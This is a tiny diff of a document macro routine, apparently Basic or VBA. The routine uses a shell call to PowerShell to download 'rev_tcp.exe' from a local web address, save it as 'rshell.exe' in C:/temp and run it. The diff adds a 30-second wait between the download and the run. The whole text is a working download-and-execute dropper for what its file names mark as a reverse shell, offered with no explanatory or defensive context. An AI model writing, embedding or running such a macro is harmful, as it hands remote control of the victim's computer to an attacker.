@@ -1,4 +1,5 @@
 Sub Main
     Shell("cmd /c powershell iwr 'http://127.0.0.1/rev_tcp.exe' -o 'C:/temp/rshell.exe'")
+    Wait(30000)
     Shell("cmd /c 'C:/temp/rshell.exe'")
 End Sub
